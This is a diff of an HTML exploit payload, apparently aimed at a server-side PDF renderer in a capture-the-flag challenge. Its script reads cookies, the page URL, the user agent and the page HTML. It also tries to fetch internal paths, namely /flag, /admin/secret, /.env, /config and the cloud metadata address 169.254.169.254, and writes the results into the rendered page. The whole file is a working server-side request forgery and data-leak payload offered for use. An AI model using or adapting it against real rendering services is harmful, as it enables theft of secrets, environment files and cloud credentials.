@@ -1,41 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Leak Internal Info</title>
+<meta charset="UTF-8" />
+<title>Info Leak Attempt</title>
+<style>
+  body { font-family: monospace; white-space: pre-wrap; background: #111; color: #eee; padding: 10px; }
+  #info { border: 1px solid #555; padding: 10px; margin-top: 10px; }
+</style>
 </head>
 <body>
-  <h1>Collecting sensitive info...</h1>
-  <pre id="output"></pre>
+<h1>Gathering Info for PDF Render</h1>
+<div id="info">Collecting info...</div>
 
-  <script>
-    const endpoints = [
-      "/flag",
-      "/admin/secret",
-      "/.env",
-      "/config",
-      "http://169.254.169.254/latest/meta-data/"
-    ];
+<script>
+(async () => {
+  let info = '';
 
-    const output = document.getElementById("output");
+  // Cookies
+  try {
+    info += 'Cookies:\n' + (document.cookie || 'No cookies') + '\n\n';
+  } catch(e) {
+    info += 'Cookies: Error accessing cookies: ' + e.message + '\n\n';
+  }
 
-    async function leak() {
-      for (const url of endpoints) {
-        try {
-          const res = await fetch(url);
-          if (res.ok) {
-            const text = await res.text();
-            output.textContent += `=== ${url} ===\n${text}\n\n`;
-          } else {
-            output.textContent += `=== ${url} ===\nFailed with status: ${res.status}\n\n`;
-          }
-        } catch (e) {
-          output.textContent += `=== ${url} ===\nError: ${e.message}\n\n`;
-        }
-      }
+  // Current URL
+  try {
+    info += 'Current URL:\n' + window.location.href + '\n\n';
+  } catch(e) {
+    info += 'Current URL: Error: ' + e.message + '\n\n';
+  }
+
+  // User Agent
+  try {
+    info += 'User Agent:\n' + navigator.userAgent + '\n\n';
+  } catch(e) {
+    info += 'User Agent: Error: ' + e.message + '\n\n';
+  }
+
+  // Full HTML content of the page (might be huge)
+  try {
+    info += 'Page HTML snippet (first 2000 chars):\n' + document.documentElement.outerHTML.slice(0, 2000) + '\n\n';
+  } catch(e) {
+    info += 'HTML: Error: ' + e.message + '\n\n';
+  }
+
+  // Try to fetch some common internal paths (will likely fail but שווה לנסות)
+  const internalPaths = [
+    '/flag',
+    '/admin/secret',
+    '/.env',
+    '/config',
+    'http://169.254.169.254/latest/meta-data/'
+  ];
+
+  for (const path of internalPaths) {
+    try {
+      const res = await fetch(path, {method: 'GET', mode: 'no-cors'}); 
+      // mode no-cors - no response body accessible but status might help
+      info += `Tried fetching ${path} — status: ${res.status || 'unknown'}\n`;
+    } catch (e) {
+      info += `Error fetching ${path}: ${e.message}\n`;
     }
+  }
 
-    leak();
-  </script>
+  // Show the info in the div
+  document.getElementById('info').textContent = info;
+})();
+</script>
 </body>
 </html>
